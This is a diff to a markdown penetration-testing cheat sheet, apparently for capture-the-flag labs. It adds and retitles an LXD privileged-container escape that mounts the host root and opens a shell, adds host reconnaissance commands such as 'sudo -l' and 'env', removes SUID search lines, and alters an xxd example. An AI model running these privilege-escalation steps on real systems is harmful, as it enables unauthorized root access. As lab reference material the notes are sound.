@@ -17,7 +17,7 @@ python3 -c 'import pty;pty.spawn("/bin/bash")'
 ```
 #### Read a raw file using `xxd`:
 ```
-xxd -r file.raw > output.txt
+xxd -r file.txt 
 ```
 `l\s`: Equivalent to `ls`
 #### Decompress a gzip file:
@@ -77,12 +77,7 @@ wfuzz -w /usr/share/dirb/wordlists/dirbuster/directory-list-2.3-medium.txt --hc 
 
 ---
 ### Privilege Escalation:
-Identify SUID/SGID files:
-```
-find / -type f -perm /4000 2>/dev/null
-find / -perm -u=s -type f 2>/dev/null
-```
-LXD container exploitation:
+#### LXD container exploitation:
 ```
 wget archive
 lxc image import ./archive --alias myimage
@@ -91,6 +86,21 @@ lxc init myimage ignite -c security.privileged=true # If not working, use FINGER
 lxc config device add ignite mydevice disk source=/ path=/mnt/root recursive=true
 lxc start ignite
 lxc exec ignite /bin/sh
+```
+#### information gathering
+```
+cat /proc/version
+cat /etc/issue
+ps
+env
+sudo -l
+hystory
+ifconfig
+ip route
+netstat # -at -l -t -tp -i
+find / -mtime 10 #find files that were modified in the last 10 days
+find . -name flag1.txt
+find / -type d -name config #find the directory named config under “/”
 ```
 ---
 
